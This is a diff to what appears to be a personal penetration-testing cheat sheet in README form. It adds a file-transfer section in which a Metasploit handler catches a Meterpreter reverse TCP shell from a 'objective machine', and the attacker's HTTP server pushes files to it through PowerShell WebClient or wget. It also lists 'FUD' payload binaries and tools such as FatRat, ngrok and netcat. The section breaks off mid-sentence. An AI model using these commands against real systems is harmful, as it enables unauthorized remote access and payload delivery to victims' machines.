@@ -189,11 +189,11 @@ __exec__ <br/>
 
 ## ---NMAP---
 
-__check active hosts without ports__ <br/>
+_check active hosts without ports_ <br/>
 
 >nmap -sn -n 192.168.0.0/24
 
-__seek for popular top 5 open ports__ <br/>
+_seek for popular top 5 open ports_ <br/>
 
 >sudo nmap -sS -n --top-ports 5 192.168.0.7
 
@@ -425,9 +425,64 @@ Install python installer: <br>
 
 ---
 
+## FILE TRANSFERING
+
+>Binaries for msfconsole: testshell, Powerfull-fud
+
+Make a connection to objective machine: <br/>
+
+```console
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.20.137
+set lport 4321
+exploit
+shell
+```
+
+Copy the file: <br/>
+
+```terminal
+cd folder
+echo "hi there" > myfile.txt
+python2 -m SimpleHTTPServer
+```
+
+Now from objective machine Powershell: <br/>
+
+```powershell
+(New-Object System.NET.WebClient).DownloadFile('http://192.168.20.137:8000/myfile.txt','c:\Users\empleado\Desktop\myfile.txt')
+```
+Or from remote console: <br/>
+
+```terminal
+powershell -c (New-Object System.NET.WebClient).DownloadFile('http://192.168.20.137:8000/myfile.txt','c:\Users\empleado\Desktop\myfile.txt')
+
+```
+
+If objective is Linux: <br/>
+
+```terminal
+wget http://192.168.20.137:8000/myfile.txt
+```
+
+```terminal
+impacket-smbserver -smb2support test .
+```
+
+Where test is 
+
+
+
+
+
+
+
+
 #      👁️👁️  
 
 ## WEB
+>we can use netcat
 
 >we can use subfinder
 
@@ -458,3 +513,17 @@ Install python installer: <br>
 >we can use wafw00f
 
 >we can use FatRat
+
+>we can use shodan
+
+>we can use port forwarding
+
+>we can use ngrok
+
+>we can use localtunnel
+
+>we can use msfconsole
+
+
+
+
